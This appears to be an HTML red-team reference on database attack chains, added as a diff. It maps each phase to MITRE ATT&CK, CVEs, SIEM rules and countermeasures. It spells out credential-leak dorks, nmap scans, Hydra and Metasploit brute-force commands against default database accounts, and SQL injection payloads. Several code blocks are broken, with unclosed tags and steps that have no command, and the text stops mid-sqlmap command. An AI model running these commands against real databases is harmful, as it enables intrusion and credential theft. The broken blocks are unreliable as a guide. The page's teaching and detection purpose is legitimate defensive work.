@@ -1,0 +1,1492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Database Attack Chain — Red Team Field Reference</title>
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #111418;
+    --bg3: #181c22;
+    --border: rgba(255,255,255,0.08);
+    --border2: rgba(255,255,255,0.14);
+    --text: #e8eaed;
+    --muted: #8a9bb0;
+    --accent: #00d4aa;
+    --accent2: #0099ff;
+    --accent3: #ff6b35;
+    --accent4: #b06bff;
+    --red: #ff4757;
+    --yellow: #ffa502;
+    --green: #2ed573;
+    --mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
+    --sans: 'IBM Plex Sans', system-ui, sans-serif;
+  }
+{ box-sizing: border-box; margin: 0; padding: 0; }
+body {
+background: var(--bg);
+color: var(--text);
+font-family: var(--sans);
+font-size: 15px;
+line-height: 1.7;
+}
+/* HEADER */
+.site-header {
+background: var(--bg2);
+border-bottom: 1px solid var(--border);
+padding: 2rem 3rem;
+position: sticky;
+top: 0;
+z-index: 100;
+display: flex;
+align-items: center;
+justify-content: space-between;
+}
+.site-header .logo {
+display: flex;
+align-items: center;
+gap: 12px;
+}
+.logo-icon {
+width: 36px; height: 36px;
+background: linear-gradient(135deg, var(--accent), var(--accent2));
+border-radius: 8px;
+display: flex; align-items: center; justify-content: center;
+font-size: 18px;
+}
+.logo-text { font-size: 13px; text-transform: uppercase; letter-spacing: 0.12em; color: var(--muted); font-weight: 600; }
+.logo-title { font-size: 16px; font-weight: 700; color: var(--text); }
+.badge-row { display: flex; gap: 8px; flex-wrap: wrap; }
+.badge {
+font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.08em;
+padding: 3px 10px; border-radius: 4px; border: 1px solid;
+}
+.badge-green { color: var(--green); border-color: rgba(46,213,115,0.3); background: rgba(46,213,115,0.08); }
+.badge-blue { color: var(--accent2); border-color: rgba(0,153,255,0.3); background: rgba(0,153,255,0.08); }
+.badge-purple { color: var(--accent4); border-color: rgba(176,107,255,0.3); background: rgba(176,107,255,0.08); }
+.badge-orange { color: var(--accent3); border-color: rgba(255,107,53,0.3); background: rgba(255,107,53,0.08); }
+.badge-red { color: var(--red); border-color: rgba(255,71,87,0.3); background: rgba(255,71,87,0.08); }
+.badge-yellow { color: var(--yellow); border-color: rgba(255,165,2,0.3); background: rgba(255,165,2,0.08); }
+/* LAYOUT */
+.layout { display: flex; min-height: 100vh; }
+/* SIDEBAR */
+.sidebar {
+width: 260px;
+min-width: 260px;
+background: var(--bg2);
+border-right: 1px solid var(--border);
+padding: 2rem 0;
+position: sticky;
+top: 73px;
+height: calc(100vh - 73px);
+overflow-y: auto;
+}
+.sidebar-section { margin-bottom: 1.5rem; }
+.sidebar-label {
+font-size: 10px; text-transform: uppercase; letter-spacing: 0.14em;
+color: var(--muted); padding: 0 1.5rem; margin-bottom: 0.5rem; font-weight: 600;
+}
+.sidebar a {
+display: block; padding: 0.45rem 1.5rem;
+font-size: 13px; color: var(--muted); text-decoration: none;
+border-left: 2px solid transparent;
+transition: all 0.15s;
+}
+.sidebar a:hover { color: var(--text); background: rgba(255,255,255,0.03); }
+.sidebar a.active { color: var(--accent); border-left-color: var(--accent); background: rgba(0,212,170,0.06); }
+.sidebar .phase-num {
+display: inline-block; width: 18px; height: 18px; border-radius: 3px;
+background: rgba(255,255,255,0.07); text-align: center; line-height: 18px;
+font-size: 10px; font-weight: 700; margin-right: 8px;
+}
+/* MAIN */
+.main { flex: 1; padding: 3rem 4rem; max-width: 960px; }
+/* SECTIONS */
+section { margin-bottom: 4rem; scroll-margin-top: 100px; }
+/* HERO */
+.hero {
+background: var(--bg3);
+border: 1px solid var(--border);
+border-radius: 12px;
+padding: 2.5rem;
+margin-bottom: 3rem;
+}
+.hero h1 {
+font-size: 28px; font-weight: 800; letter-spacing: -0.02em;
+background: linear-gradient(90deg, var(--accent), var(--accent2));
+-webkit-background-clip: text; -webkit-text-fill-color: transparent;
+background-clip: text;
+margin-bottom: 0.75rem;
+}
+.hero p { color: var(--muted); font-size: 15px; line-height: 1.75; max-width: 640px; margin-bottom: 1.25rem; }
+.hero-meta { display: flex; gap: 1.5rem; flex-wrap: wrap; }
+.hero-meta span { font-size: 12px; color: var(--muted); }
+.hero-meta span strong { color: var(--text); }
+/* PHASE CARD */
+.phase-card {
+background: var(--bg3);
+border: 1px solid var(--border);
+border-radius: 12px;
+overflow: hidden;
+margin-bottom: 2rem;
+}
+.phase-header {
+display: flex; align-items: center; gap: 1rem;
+padding: 1.25rem 1.75rem;
+background: var(--bg2);
+border-bottom: 1px solid var(--border);
+}
+.phase-number {
+width: 32px; height: 32px; border-radius: 8px;
+display: flex; align-items: center; justify-content: center;
+font-size: 13px; font-weight: 800; flex-shrink: 0;
+}
+.phase-header h2 { font-size: 17px; font-weight: 700; flex: 1; }
+.phase-body { padding: 1.75rem; }
+/* SUBSECTIONS */
+.sub-grid {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 1rem;
+margin-bottom: 1.25rem;
+}
+.sub-card {
+background: var(--bg);
+border: 1px solid var(--border);
+border-radius: 8px;
+padding: 1rem 1.25rem;
+}
+.sub-card.full { grid-column: 1 / -1; }
+.sub-label {
+font-size: 10px; text-transform: uppercase; letter-spacing: 0.12em;
+font-weight: 700; margin-bottom: 0.6rem; display: flex; align-items: center; gap: 6px;
+}
+.sub-label .dot { width: 6px; height: 6px; border-radius: 50%; }
+.sub-card p, .sub-card li { font-size: 13.5px; color: var(--muted); line-height: 1.7; }
+.sub-card li { list-style: none; padding-left: 1rem; position: relative; }
+.sub-card li::before { content: '›'; position: absolute; left: 0; color: var(--accent); }
+.sub-card ul { display: flex; flex-direction: column; gap: 4px; }
+/* CODE BLOCKS */
+pre {
+background: #0d1117;
+border: 1px solid var(--border);
+border-radius: 8px;
+padding: 1.25rem 1.5rem;
+overflow-x: auto;
+font-size: 12.5px;
+line-height: 1.65;
+font-family: var(--mono);
+margin: 0.75rem 0;
+}
+code { font-family: var(--mono); }
+.code-header {
+display: flex; align-items: center; justify-content: space-between;
+background: #161b22;
+border: 1px solid var(--border);
+border-bottom: none;
+border-radius: 8px 8px 0 0;
+padding: 0.5rem 1rem;
+font-size: 11px; color: var(--muted);
+}
+.code-header + pre { border-radius: 0 0 8px 8px; margin-top: 0; }
+.comment { color: #6a737d; }
+.kw { color: #ff79c6; }
+.str { color: #f1fa8c; }
+.cmd { color: var(--accent); }
+.flag { color: var(--accent2); }
+.val { color: var(--accent3); }
+.sql-kw { color: #bd93f9; }
+.sql-fn { color: #50fa7b; }
+.sql-str { color: #f1fa8c; }
+/* MITRE TAG */
+.mitre-tag {
+display: inline-flex; align-items: center; gap: 5px;
+background: rgba(176,107,255,0.1); border: 1px solid rgba(176,107,255,0.25);
+color: var(--accent4); font-size: 11px; font-weight: 600;
+padding: 3px 8px; border-radius: 4px; font-family: var(--mono);
+text-decoration: none;
+}
+/* CVE */
+.cve-block {
+border-left: 3px solid var(--red);
+background: rgba(255,71,87,0.06);
+border-radius: 0 6px 6px 0;
+padding: 1rem 1.25rem;
+margin: 0.75rem 0;
+}
+.cve-title { font-size: 13px; font-weight: 700; color: var(--red); font-family: var(--mono); margin-bottom: 4px; }
+.cve-body { font-size: 13px; color: var(--muted); }
+/* DETECTION */
+.detection-block {
+border-left: 3px solid var(--yellow);
+background: rgba(255,165,2,0.06);
+border-radius: 0 6px 6px 0;
+padding: 1rem 1.25rem;
+margin: 0.75rem 0;
+}
+.detection-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; color: var(--yellow); margin-bottom: 4px; }
+.detection-block p { font-size: 13px; color: var(--muted); }
+/* DEFENSE */
+.defense-block {
+border-left: 3px solid var(--green);
+background: rgba(46,213,115,0.06);
+border-radius: 0 6px 6px 0;
+padding: 1rem 1.25rem;
+margin: 0.75rem 0;
+}
+.defense-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; color: var(--green); margin-bottom: 4px; }
+.defense-block p, .defense-block li { font-size: 13px; color: var(--muted); }
+.defense-block li { list-style: disc; margin-left: 1rem; }
+/* DIVIDER */
+hr { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
+/* TABLE */
+.table-wrap { overflow-x: auto; margin: 1rem 0; }
+table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+thead tr { background: var(--bg2); }
+th { padding: 0.75rem 1rem; text-align: left; font-size: 11px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); font-weight: 600; border-bottom: 1px solid var(--border); }
+td { padding: 0.7rem 1rem; border-bottom: 1px solid var(--border); color: var(--muted); vertical-align: top; }
+td:first-child { color: var(--text); font-weight: 500; }
+tr:hover td { background: rgba(255,255,255,0.02); }
+/* SECTION TITLES */
+.section-title {
+font-size: 22px; font-weight: 800; margin-bottom: 0.5rem; letter-spacing: -0.01em;
+}
+.section-sub { color: var(--muted); font-size: 14px; margin-bottom: 1.75rem; }
+/* INFO CALLOUT */
+.callout {
+background: rgba(0,153,255,0.07);
+border: 1px solid rgba(0,153,255,0.2);
+border-radius: 8px;
+padding: 1rem 1.25rem;
+font-size: 13.5px;
+color: var(--muted);
+margin: 1rem 0;
+}
+.callout strong { color: var(--accent2); }
+/* THREAT ACTOR */
+.apt-card {
+background: var(--bg3);
+border: 1px solid var(--border);
+border-left: 4px solid var(--red);
+border-radius: 0 10px 10px 0;
+padding: 1.5rem;
+margin-bottom: 1.25rem;
+}
+.apt-name { font-size: 16px; font-weight: 800; color: var(--red); margin-bottom: 6px; }
+.apt-meta { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px; }
+.apt-body { font-size: 13.5px; color: var(--muted); line-height: 1.75; }
+/* CERT MATRIX */
+.cert-row { display: flex; gap: 8px; align-items: flex-start; margin-bottom: 10px; }
+.cert-badge {
+flex-shrink: 0; min-width: 90px; text-align: center;
+font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.06em;
+padding: 5px 10px; border-radius: 6px;
+}
+.cert-content { font-size: 13px; color: var(--muted); padding-top: 3px; }
+/* LAB */
+.lab-item {
+display: flex; gap: 1rem; align-items: flex-start;
+background: var(--bg3); border: 1px solid var(--border);
+border-radius: 8px; padding: 1rem 1.25rem; margin-bottom: 0.75rem;
+}
+.lab-icon { font-size: 22px; flex-shrink: 0; margin-top: 2px; }
+.lab-name { font-size: 14px; font-weight: 700; margin-bottom: 4px; }
+.lab-desc { font-size: 13px; color: var(--muted); }
+/* SCROLLBAR */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+/* RESPONSIVE */
+@media (max-width: 900px) {
+.site-header { padding: 1.25rem 1.5rem; }
+.sidebar { display: none; }
+.main { padding: 2rem 1.5rem; }
+.sub-grid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+<header class="site-header">
+  <div class="logo">
+    <div class="logo-icon">⚡</div>
+    <div>
+      <div class="logo-text">Red Team Field Reference</div>
+      <div class="logo-title">Database Attack Chain</div>
+    </div>
+  </div>
+  <div class="badge-row">
+    <span class="badge badge-green">CEH v12</span>
+    <span class="badge badge-orange">OSCP / PEN-200</span>
+    <span class="badge badge-blue">Security+ SY0-701</span>
+    <span class="badge badge-purple">eWPTX</span>
+  </div>
+</header>
+<div class="layout">
+  <!-- SIDEBAR -->
+<nav class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">Lifecycle Phases</div>
+      <a href="#recon"><span class="phase-num">1</span>Reconnaissance</a>
+      <a href="#initial-access"><span class="phase-num">2</span>Initial Access</a>
+      <a href="#vuln-discovery"><span class="phase-num">3</span>Vuln Discovery</a>
+      <a href="#exploitation"><span class="phase-num">4</span>Exploitation</a>
+      <a href="#postex"><span class="phase-num">5</span>Post-Exploitation</a>
+      <a href="#credential"><span class="phase-num">6</span>Credential Harvesting</a>
+      <a href="#exfil"><span class="phase-num">7</span>Exfiltration</a>
+      <a href="#persistence"><span class="phase-num">8</span>Persistence</a>
+      <a href="#tracks"><span class="phase-num">9</span>Covering Tracks</a>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Reference</div>
+      <a href="#apt-profiles">Threat Actor Profiles</a>
+      <a href="#lab-setup">Lab Setup</a>
+      <a href="#cert-matrix">Cert Alignment Matrix</a>
+    </div>
+  </nav>
+  <!-- MAIN CONTENT -->
+<main class="main">
+    <!-- HERO -->
+    <div class="hero">
+      <h1>Database Attack Chain — Full Lifecycle Reference</h1>
+      <p>A technically rigorous, operationally grounded analysis of database intrusion chains covering MSSQL, MySQL/MariaDB, PostgreSQL, Oracle DB, and MongoDB. Structured using the Unified Kill Chain combined with MITRE ATT&CK for Enterprise. Each phase maps attacker TTPs to defensive countermeasures, CVEs, and detection engineering guidance.</p>
+      <div class="hero-meta">
+        <span><strong>Frameworks:</strong> MITRE ATT&CK · OWASP · NIST SP 800-53 · CIS Controls v8</span>
+        <span><strong>Audience:</strong> Red teamers, pentesters, SOC engineers, security students</span>
+        <span><strong>Methodology:</strong> Unified Kill Chain</span>
+      </div>
+    </div>
+
+    <!-- PHASE 1: RECON -->
+    <section id="recon">
+      <div class="phase-card">
+        <div class="phase-header">
+          <div class="phase-number" style="background: rgba(0,212,170,0.15); color: var(--accent);">01</div>
+          <h2>Reconnaissance</h2>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;">
+            <span class="badge badge-green">Passive OSINT</span>
+            <span class="badge badge-blue">Active Fingerprinting</span>
+          </div>
+        </div>
+        <div class="phase-body">
+
+          <div class="sub-grid">
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--accent)"><span class="dot" style="background:var(--accent)"></span>Attacker Objective</div>
+              <p>Map the target's database attack surface before touching a single port. The goal is maximum intelligence with minimum noise — identifying exposed database services, software versions, credentials leaked in public repositories, and configuration files inadvertently indexed by search engines.</p>
+            </div>
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--accent4)"><span class="dot" style="background:var(--accent4)"></span>MITRE ATT&CK</div>
+              <p><span class="mitre-tag">TA0043 – Reconnaissance</span><br><br>
+              <span class="mitre-tag">T1596 – Search Open Technical Databases</span><br><br>
+              <span class="mitre-tag">T1593.002 – Search: Social Media</span><br><br>
+              <span class="mitre-tag">T1595 – Active Scanning</span></p>
+            </div>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent2)"><span class="dot" style="background:var(--accent2)"></span>Passive OSINT Techniques</div>
+
+            <p style="margin-bottom:8px;font-size:13.5px;color:var(--text)">Shodan / Censys — Exposed Database Hosts</p>
+            <div class="code-header"><span>Shodan Dork Queries</span><span class="badge badge-blue">OSINT</span></div>
+<pre><span class="comment"># MSSQL instances with default port</span>
+<span class="cmd">port:1433 product:"Microsoft SQL Server"</span>
+
+<span class="comment"># MySQL with version disclosure</span>
+<span class="cmd">port:3306 "MySQL" country:"IT"</span>
+
+<span class="comment"># PostgreSQL with auth methods</span>
+<span class="cmd">port:5432 "PostgreSQL" "authentication failed"</span>
+
+<span class="comment"># Oracle TNS Listener exposed</span>
+<span class="cmd">port:1521 "Oracle" "(DESCRIPTION="</span>
+
+<span class="comment"># MongoDB no-auth (historically catastrophic)</span>
+            <p style="margin-top:1rem;margin-bottom:8px;font-size:13.5px;color:var(--text)">Google Dorks — Leaked Connection Strings</p>
+            <div class="code-header"><span>Google Dork Queries</span><span class="badge badge-blue">OSINT</span></div>
+<pre><span class="comment"># Exposed SQL dump files</span>
+<span class="cmd">filetype:sql "INSERT INTO" "users" "password"</span>
+
+<span class="comment"># Connection strings in config files</span>
+<span class="cmd">filetype:config "connectionString" "password=" site:github.com</span>
+
+<span class="comment"># .env files with DB credentials</span>
+<span class="cmd">filetype:env "DB_PASSWORD" "DB_HOST" site:github.com</span>
+
+<span class="comment"># Exposed phpMyAdmin panels</span>
+<span class="cmd">inurl:"/phpmyadmin/index.php" intitle:"phpMyAdmin"</span>
+
+<span class="comment"># Adminer single-file DB manager</span>
+            <p style="margin-top:1rem;margin-bottom:8px;font-size:13.5px;color:var(--text)">GitHub Secret Scanning</p>
+            <div class="code-header"><span>GitHub Dork Examples</span><span class="badge badge-blue">OSINT</span></div>
+<pre><span class="comment"># Search for MSSQL connection strings</span>
+<span class="cmd">github.com search:</span> <span class="str">"Data Source=;Initial Catalog=;User ID=;Password="</span>
+
+<span class="comment"># MySQL credentials in Python apps</span>
+<span class="str">"mysql.connector.connect" "password=" language:python</span>
+
+<span class="comment"># PostgreSQL DSN strings</span>
+<span class="str">"postgresql://" "password" language:python OR language:ruby</span>
+
+<span class="comment"># Tools: truffleHog, gitleaks, git-secrets</span>
+<span class="cmd">trufflehog</span> <span class="flag">--regex --entropy=False</span> <span class="val">https://github.com/target/repo</span>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent2)"><span class="dot" style="background:var(--accent2)"></span>Active Fingerprinting</div>
+            <div class="code-header"><span>Nmap — DB Service Version Detection</span><span class="badge badge-orange">Active</span></div>
+<pre><span class="comment"># Comprehensive DB port scan with service/version detection</span>
+<span class="cmd">nmap</span> <span class="flag">-sV -sC -p 1433,3306,5432,1521,27017,5984,6379,9200</span> \
+     <span class="flag">--script</span> <span class="val">ms-sql-info,mysql-info,pgsql-brute,oracle-sid-brute</span> \
+     <span class="flag">-oN</span> <span class="val">db_scan.txt</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># MSSQL-specific NSE scripts</span>
+<span class="cmd">nmap</span> <span class="flag">-p 1433</span> <span class="flag">--script</span> <span class="val">ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell</span> <span class="val">&lt;TARGET&gt;</span>
+
+<span class="comment"># Oracle SID enumeration</span>
+<span class="cmd">nmap</span> <span class="flag">-p 1521</span> <span class="flag">--script</span> <span class="val">oracle-sid-brute</span> <span class="flag">--script-args</span> <span class="val">brute.firstonly=true</span> <span class="val">&lt;TARGET&gt;</span>
+
+<span class="comment"># Banner grab for version disclosure</span>
+<span class="cmd">nc -v &lt;TARGET&gt; 3306</span>  <span class="comment"># MySQL banner reveals exact version</span>
+          </div>
+
+          <div class="cve-block">
+            <div class="cve-title">CVE-2012-2122 | CVSS 5.1 | MySQL Authentication Bypass</div>
+            <div class="cve-body">A timing flaw in MySQL 5.x allowed authentication bypass by repeatedly attempting login with a known username — roughly 1 in 256 attempts succeeded due to memcmp() returning early on a match. Version disclosure from banner grab was critical to targeting vulnerable instances.</div>
+          </div>
+
+          <div class="detection-block">
+            <div class="detection-label">🔍 SOC / SIEM Detection Logic</div>
+            <p>Alert on: multiple connection attempts to DB ports (1433, 3306, 5432, 1521) from non-application hosts within a short window. Monitor threat intel feeds for your org's public IPs appearing in Shodan. Integrate GitGuardian or GitHub Advanced Security to detect credential pushes in real time. SIEM rule: <code>dest_port IN (1433,3306,5432,1521) AND src_ip NOT IN application_server_whitelist AND count > 5 within 60s</code></p>
+          </div>
+
+          <div class="defense-block">
+            <div class="defense-label">🛡 Countermeasures</div>
+            <ul>
+              <li><strong>NIST SP 800-53 SC-7:</strong> Boundary protection — restrict DB ports to internal networks only via firewall ACLs. DB should never be directly reachable from the internet.</li>
+              <li><strong>CIS Control 4.2:</strong> Maintain an inventory of authorized software. Disable unnecessary database listeners and services.</li>
+              <li><strong>OWASP ASVS V6:</strong> Never store credentials in source code. Implement secrets management (HashiCorp Vault, AWS Secrets Manager).</li>
+              <li>Enable GitHub Advanced Security secret scanning and push protection on all repositories.</li>
+            </ul>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- PHASE 2: INITIAL ACCESS -->
+    <section id="initial-access">
+      <div class="phase-card">
+        <div class="phase-header">
+          <div class="phase-number" style="background: rgba(0,153,255,0.15); color: var(--accent2);">02</div>
+          <h2>Initial Access &amp; Attack Surface Mapping</h2>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;">
+            <span class="badge badge-blue">Default Creds</span>
+            <span class="badge badge-orange">Misconfig</span>
+          </div>
+        </div>
+        <div class="phase-body">
+
+          <div class="sub-grid">
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--accent2)"><span class="dot" style="background:var(--accent2)"></span>Attacker Objective</div>
+              <p>Gain an authenticated foothold on a database system using the path of least resistance: default credentials left unchanged, databases bound to 0.0.0.0, anonymous access enabled, or misconfigurations in remote access controls (xp_cmdshell pre-enabled, pg_hba.conf set to "trust").</p>
+            </div>
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--accent4)"><span class="dot" style="background:var(--accent4)"></span>MITRE ATT&CK</div>
+              <p><span class="mitre-tag">TA0001 – Initial Access</span><br><br>
+              <span class="mitre-tag">T1078.001 – Default Accounts</span><br><br>
+              <span class="mitre-tag">T1190 – Exploit Public-Facing Application</span><br><br>
+              <span class="mitre-tag">T1110.001 – Password Spraying</span></p>
+            </div>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent3)"><span class="dot" style="background:var(--accent3)"></span>Default Credentials Reference</div>
+            <div class="table-wrap">
+              <table>
+                <thead><tr><th>Database</th><th>Default Username</th><th>Default Password</th><th>Port</th><th>Risk</th></tr></thead>
+                <tbody>
+                  <tr><td>MSSQL</td><td>sa</td><td>(blank) or "sa"</td><td>1433/TCP</td><td><span class="badge badge-red">Critical</span></td></tr>
+                  <tr><td>MySQL</td><td>root</td><td>(blank)</td><td>3306/TCP</td><td><span class="badge badge-red">Critical</span></td></tr>
+                  <tr><td>PostgreSQL</td><td>postgres</td><td>postgres</td><td>5432/TCP</td><td><span class="badge badge-orange">High</span></td></tr>
+                  <tr><td>Oracle</td><td>SYS / SYSTEM</td><td>change_on_install / manager</td><td>1521/TCP</td><td><span class="badge badge-red">Critical</span></td></tr>
+                  <tr><td>MongoDB</td><td>(none)</td><td>(no auth by default &lt;2.6)</td><td>27017/TCP</td><td><span class="badge badge-red">Critical</span></td></tr>
+                  <tr><td>Redis</td><td>(none)</td><td>(no auth by default)</td><td>6379/TCP</td><td><span class="badge badge-red">Critical</span></td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent2)"><span class="dot" style="background:var(--accent2)"></span>Tooling & Attack Commands</div>
+            <div class="code-header"><span>Hydra — Credential Brute Force</span><span class="badge badge-orange">Credential Attack</span></div>
+<pre><span class="comment"># MSSQL brute force</span>
+<span class="cmd">hydra</span> <span class="flag">-l sa -P /usr/share/wordlists/rockyou.txt</span> <span class="val">&lt;TARGET&gt;</span> <span class="flag">mssql</span>
+
+<span class="comment"># MySQL brute force</span>
+<span class="cmd">hydra</span> <span class="flag">-l root -P /usr/share/wordlists/rockyou.txt</span> <span class="val">&lt;TARGET&gt;</span> <span class="flag">mysql</span>
+
+<span class="comment"># PostgreSQL spray against common usernames</span>
+<span class="cmd">hydra</span> <span class="flag">-L users.txt -P passwords.txt</span> <span class="val">&lt;TARGET&gt;</span> <span class="flag">postgres</span>
+
+<span class="comment"># Medusa for MSSQL (faster on bulk operations)</span>
+            <div class="code-header"><span>Metasploit — DB Login Scanners</span><span class="badge badge-red">Exploitation</span></div>
+<pre><span class="comment"># MSSQL login scanner</span>
+<span class="kw">use</span> <span class="val">auxiliary/scanner/mssql/mssql_login</span>
+<span class="kw">set</span> <span class="flag">RHOSTS</span> <span class="val">192.168.1.0/24</span>
+<span class="kw">set</span> <span class="flag">USERNAME</span> <span class="val">sa</span>
+<span class="kw">set</span> <span class="flag">PASS_FILE</span> <span class="val">/usr/share/wordlists/rockyou.txt</span>
+<span class="kw">run</span>
+
+<span class="comment"># MySQL enum (no auth)</span>
+<span class="kw">use</span> <span class="val">auxiliary/scanner/mysql/mysql_authbypass_hashdump</span>
+<span class="kw">set</span> <span class="flag">RHOSTS</span> <span class="val">192.168.1.50</span>
+<span class="kw">run</span>
+
+<span class="comment"># PostgreSQL: check for trust auth in pg_hba.conf</span>
+<span class="kw">use</span> <span class="val">auxiliary/scanner/postgres/postgres_login</span>
+<span class="kw">set</span> <span class="flag">RHOSTS</span> <span class="val">192.168.1.60</span>
+            <div class="code-header"><span>PostgreSQL pg_hba.conf Misconfiguration</span><span class="badge badge-orange">Misconfig</span></div>
+<pre><span class="comment"># pg_hba.conf with "trust" = no password needed</span>
+<span class="comment"># Attacker connects directly if reachable</span>
+<span class="kw">host</span>    <span class="val">all</span>    <span class="val">all</span>    <span class="val">0.0.0.0/0</span>    <span class="str">trust</span>   <span class="comment"># CRITICAL MISCONFIGURATION</span>
+
+<span class="comment"># Connect without credentials</span>
+<span class="cmd">psql</span> <span class="flag">-h &lt;TARGET&gt; -U postgres -d postgres</span>
+
+<span class="comment"># MSSQL: check if xp_cmdshell is enabled (pre-escalation indicator)</span>
+          </div>
+
+          <div class="cve-block">
+            <div class="cve-title">CVE-2020-14882 / CVE-2020-14883 | CVSS 9.8 | Oracle WebLogic RCE (DB Access Chain)</div>
+            <div class="cve-body">Authentication bypass in Oracle WebLogic Server Console allowed unauthenticated attackers to execute arbitrary commands. Frequently chained with Oracle DB exploitation — attacker accesses the management console, then pivots to the connected Oracle DB using harvested credentials from the WebLogic config. Actively exploited by multiple APT groups within 48 hours of disclosure.</div>
+          </div>
+
+          <div class="detection-block">
+            <div class="detection-label">🔍 SOC / SIEM Detection Logic</div>
+            <p>Alert on: successful authentication to DB from non-whitelisted IP ranges, especially with default usernames (sa, root, postgres). Monitor for authentication failures exceeding threshold (>10 attempts/minute per source IP). Enable SQL Server Audit and MySQL General Query Log for authentication events. SIEM rule: <code>event_type=db_auth AND username IN ("sa","root","postgres","SYSTEM") AND src_ip NOT IN trusted_subnets</code></p>
+          </div>
+
+          <div class="defense-block">
+            <div class="defense-label">🛡 Countermeasures</div>
+            <ul>
+              <li><strong>NIST SP 800-53 IA-5:</strong> Authenticator management — enforce password complexity, disable default accounts immediately post-installation.</li>
+              <li><strong>CIS Control 5.2:</strong> Use unique passwords and disable any default passwords.</li>
+              <li>Bind DB listeners to loopback (127.0.0.1) or internal VLANs only. Never expose port 1433/3306/5432 directly to the internet.</li>
+              <li>On PostgreSQL: configure pg_hba.conf with <code>scram-sha-256</code> for all remote connections. Remove <code>trust</code> entries.</li>
+              <li>Disable MongoDB's legacy bind_ip=0.0.0.0 default and enable mandatory auth from first deployment.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- PHASE 3: VULNERABILITY DISCOVERY -->
+    <section id="vuln-discovery">
+      <div class="phase-card">
+        <div class="phase-header">
+          <div class="phase-number" style="background: rgba(255,165,2,0.15); color: var(--yellow);">03</div>
+          <h2>Vulnerability Discovery</h2>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;">
+            <span class="badge badge-yellow">Error Fingerprinting</span>
+            <span class="badge badge-orange">SQLi Detection</span>
+          </div>
+        </div>
+        <div class="phase-body">
+
+          <div class="sub-grid">
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--yellow)"><span class="dot" style="background:var(--yellow)"></span>Attacker Objective</div>
+              <p>Identify injection points in web application layer that feed data to a backend database. The goal is to confirm the presence and type of SQL injection (error-based, blind, out-of-band) before weaponization. Database engine fingerprinting at this stage determines which exploitation syntax to use.</p>
+            </div>
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--accent4)"><span class="dot" style="background:var(--accent4)"></span>MITRE ATT&CK</div>
+              <p><span class="mitre-tag">TA0043 – Reconnaissance</span><br><br>
+              <span class="mitre-tag">T1595.002 – Vulnerability Scanning</span><br><br>
+              <span class="mitre-tag">T1592 – Gather Victim Host Info</span></p>
+            </div>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--yellow)"><span class="dot" style="background:var(--yellow)"></span>Manual SQLi Detection — Error-Based Fingerprinting</div>
+            <div class="code-header"><span>Manual Injection Test Payloads</span><span class="badge badge-yellow">Manual Testing</span></div>
+<pre><span class="comment"># Single quote — triggers syntax error revealing DB engine</span>
+<span class="val">https://target.com/item?id=1'</span>
+
+<span class="comment"># MySQL error example:</span>
+<span class="str">You have an error in your SQL syntax; check the manual that
+corresponds to your MySQL server version near ''' at line 1</span>
+
+<span class="comment"># MSSQL error example:</span>
+<span class="str">Unclosed quotation mark after the character string ''</span>
+
+<span class="comment"># PostgreSQL error example:</span>
+<span class="str">ERROR: unterminated quoted string at or near "'"</span>
+
+<span class="comment"># Oracle error example:</span>
+<span class="str">ORA-01756: quoted string not properly terminated</span>
+
+<span class="comment"># Time-based blind detection (confirm injectable without error output)</span>
+<span class="comment"># MySQL:</span>
+<span class="val">id=1 AND SLEEP(5)--</span>                  <span class="comment"># 5s delay = injectable</span>
+<span class="comment"># MSSQL:</span>
+<span class="val">id=1; WAITFOR DELAY '0:0:5'--</span>        <span class="comment"># 5s delay = injectable</span>
+<span class="comment"># PostgreSQL:</span>
+<span class="val">id=1; SELECT pg_sleep(5)--</span>
+<span class="comment"># Oracle:</span>
+<span class="val">id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--</span>
+
+<span class="comment"># Boolean-based blind (compare responses)</span>
+<span class="val">id=1 AND 1=1--</span>   <span class="comment"># True — original page</span>
+            <div class="code-header"><span>SQLMap — Automated Discovery</span><span class="badge badge-orange">Automated</span></div>
+<pre><span class="comment"># Full enumeration with maximum sensitivity</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"https://target.com/page?id=1"</span> \
